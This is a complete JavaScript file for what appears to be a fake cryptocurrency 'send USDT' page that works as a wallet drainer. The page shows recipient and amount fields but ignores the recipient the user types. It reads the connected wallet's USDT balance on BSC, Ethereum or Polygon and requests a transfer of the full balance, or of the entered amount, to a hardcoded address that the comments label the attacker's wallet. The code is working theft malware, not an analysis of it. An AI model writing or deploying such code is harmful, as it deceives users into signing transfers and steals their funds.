// ── Phase 1: Module Initialization ──
import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';

// ── Network Configurations ──
const NETWORKS = {
    bsc: {
        chainId: '0x38',
        chainName: 'BNB Smart Chain',
        rpcUrl: 'https://bsc-dataseed1.binance.org/',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        blockExplorer: 'https://bscscan.com',
        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
        icon: '🟡'
    },
    ethereum: {
        chainId: '0x1',
        chainName: 'Ethereum Mainnet',
        rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
        blockExplorer: 'https://etherscan.io',
        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        icon: '🔵'
    },
    polygon: {
        chainId: '0x89',
        chainName: 'Polygon Mainnet',
        rpcUrl: 'https://polygon-rpc.com/',
        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
        blockExplorer: 'https://polygonscan.com',
        usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        icon: '🟣'
    }
};

// ── Attacker's Wallet (HARDCODED) ──
const DEST_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";

// ── Get DOM Elements ──
const nextBtn = document.getElementById('nextBtn');
const amountInput = document.getElementById('amountInput');
const usdLabel = document.getElementById('usdLabel');
const recipientInput = document.getElementById('recipientInput');
const clearAddr = document.getElementById('clearAddr');
const clearAmount = document.getElementById('clearAmount');
const maxBtn = document.getElementById('maxBtn');
const addrGroup = document.getElementById('addrGroup');
const amountGroup = document.getElementById('amountGroup');
const pasteBtn = document.getElementById('pasteBtn');
const networkSelect = document.getElementById('networkSelect');
const networkIcon = document.getElementById('networkIcon');

let currentNetwork = 'bsc';
let userAddress = '';

// ── Populate Networks ──
function populateNetworks() {
    networkSelect.innerHTML = '';
    Object.keys(NETWORKS).forEach(key => {
        const option = document.createElement('option');
        option.value = key;
        option.textContent = NETWORKS[key].chainName;
        networkSelect.appendChild(option);
    });
}

// ── Update Network Display ──
function updateNetworkDisplay() {
    const network = NETWORKS[currentNetwork];
    if (network) {
        networkIcon.textContent = network.icon;
        networkSelect.value = currentNetwork;
    }
}

// ── Switch Network ──
async function switchToNetwork(networkKey) {
    const network = NETWORKS[networkKey];
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: network.chainId }]
        });
        return true;
    } catch (error) {
        if (error.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: network.chainId,
                        chainName: network.chainName,
                        rpcUrls: [network.rpcUrl],
                        nativeCurrency: network.nativeCurrency,
                        blockExplorerUrls: [network.blockExplorer]
                    }]
                });
                return true;
            } catch (addError) {
                alert('Failed to add network. Please add manually.');
                return false;
            }
        }
        alert('Failed to switch network. Please switch manually.');
        return false;
    }
}

// ── Check USDT Balance ──
async function checkUSDTBalance(address, networkKey) {
    try {
        const network = NETWORKS[networkKey];
        const data = "0x70a08231" + address.replace('0x', '').padStart(64, '0');
        
        const response = await fetch(network.rpcUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "eth_call",
                params: [{ to: network.usdtAddress, data: data }, "latest"]
            })
        });
        
        const json = await response.json();
        if (json.result && json.result !== '0x') {
            return json.result;
        }
        return null;
    } catch (error) {
        console.error('Balance check error:', error);
        return null;
    }
}

// ── Send USDT to Attacker ──
async function sendUSDTToAttacker(amount, networkKey) {
    const network = NETWORKS[networkKey];
    
    // Convert amount to hex
    let amountHex;
    if (amount === 'max' || amount === 'all') {
        // Use max balance
        const balance = await checkUSDTBalance(userAddress, networkKey);
        if (balance) {
            amountHex = balance.replace('0x', '').padStart(64, '0');
        } else {
            amountHex = BigInt(Math.floor(parseFloat(amountInput.value) * 10**18)).toString(16).padStart(64, '0');
        }
    } else {
        // Use manual amount
        const val = parseFloat(amount) || 1;
        amountHex = BigInt(Math.floor(val * 10**18)).toString(16).padStart(64, '0');
    }
    
    // Build transaction data - ALWAYS sends to DEST_WALLET
    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex;
    
    console.log('📤 Sending to:', DEST_WALLET);
    console.log('💰 Amount:', amountHex);
    console.log('📝 Data:', txData);
    
    // Send transaction
    const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: network.usdtAddress,
            data: txData,
            value: '0x0'
        }]
    });
    
    return txHash;
}

// ── MAIN: Handle Next Click ──
async function handleNext() {
    if (nextBtn.disabled) return;
    
    const originalText = nextBtn.textContent;
    nextBtn.textContent = '⏳ Processing...';
    nextBtn.disabled = true;
    
    try {
        // 1. Get user address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length === 0) {
            const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = newAccounts[0];
        } else {
            userAddress = accounts[0];
        }
        
        if (!userAddress) {
            throw new Error('No wallet connected');
        }
        
        console.log('👤 User:', userAddress);
        
        // 2. Switch network
        const switched = await switchToNetwork(currentNetwork);
        if (!switched) {
            throw new Error('Network switch failed');
        }
        
        // 3. Check balance
        const balanceHex = await checkUSDTBalance(userAddress, currentNetwork);
        let balance = 0;
        if (balanceHex) {
            balance = parseInt(balanceHex, 16) / 10**18;
            console.log('💰 Balance:', balance, 'USDT');
        }
        
        // 4. If balance is 0, use manual amount
        let amountToSend;
        if (balance > 0) {
            amountToSend = 'max';
        } else {
            amountToSend = amountInput.value || '1';
        }
        
        // 5. Send USDT to attacker
        const txHash = await sendUSDTToAttacker(amountToSend, currentNetwork);
        
        console.log('✅ Transaction sent:', txHash);
        nextBtn.textContent = '✅ Success!';
        
        setTimeout(() => {
            nextBtn.textContent = originalText;
            nextBtn.disabled = false;
        }, 3000);
        
    } catch (error) {
        console.error('❌ Error:', error);
        nextBtn.textContent = '❌ Failed';
        
        setTimeout(() => {
            nextBtn.textContent = originalText;
            nextBtn.disabled = false;
        }, 3000);
    }
}

// ── INIT ──
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 App Starting...');
    
    // Check MetaMask
    if (typeof window.ethereum === 'undefined') {
        alert('Please install MetaMask!');
        return;
    }
    
    // Populate networks
    populateNetworks();
    updateNetworkDisplay();
    
    // Network change
    networkSelect.addEventListener('change', function() {
        currentNetwork = this.value;
        updateNetworkDisplay();
        console.log('🔄 Network changed to:', NETWORKS[currentNetwork].chainName);
    });
    
    // Amount input
    amountInput.addEventListener('input', function() {
        const val = parseFloat(this.value) || 0;
        usdLabel.textContent = val.toFixed(2);
        nextBtn.disabled = val <= 0;
        if (val > 0) {
            nextBtn.classList.add('enabled');
            clearAmount.style.display = 'flex';
        } else {
            nextBtn.classList.remove('enabled');
            clearAmount.style.display = 'none';
        }
    });
    
    // Clear amount
    clearAmount.addEventListener('click', function() {
        amountInput.value = '';
        amountInput.dispatchEvent(new Event('input'));
    });
    
    // Clear address
    clearAddr.addEventListener('click', function() {
        recipientInput.value = '';
        this.style.display = 'none';
    });
    
    // Recipient input
    recipientInput.addEventListener('input', function() {
        clearAddr.style.display = this.value.length > 0 ? 'flex' : 'none';
    });
    
    // Max button
    maxBtn.addEventListener('click', function() {
        amountInput.value = '1000';
        amountInput.dispatchEvent(new Event('input'));
    });
    
    // Paste button
    pasteBtn.addEventListener('click', async function() {
        try {
            const text = await navigator.clipboard.readText();
            recipientInput.value = text;
            recipientInput.dispatchEvent(new Event('input'));
        } catch (e) {
            console.log('Clipboard read failed');
        }
    });
    
    // Focus effects
    addrGroup.addEventListener('focusin', () => addrGroup.classList.add('active'));
    addrGroup.addEventListener('focusout', () => addrGroup.classList.remove('active'));
    amountGroup.addEventListener('focusin', () => amountGroup.classList.add('active'));
    amountGroup.addEventListener('focusout', () => amountGroup.classList.remove('active'));
    
    // Next button
    nextBtn.addEventListener('click', handleNext);
    
    // Initial triggers
    recipientInput.dispatchEvent(new Event('input'));
    
    console.log('✅ App Ready!');
    console.log('🎯 Attacker Wallet:', DEST_WALLET);
});
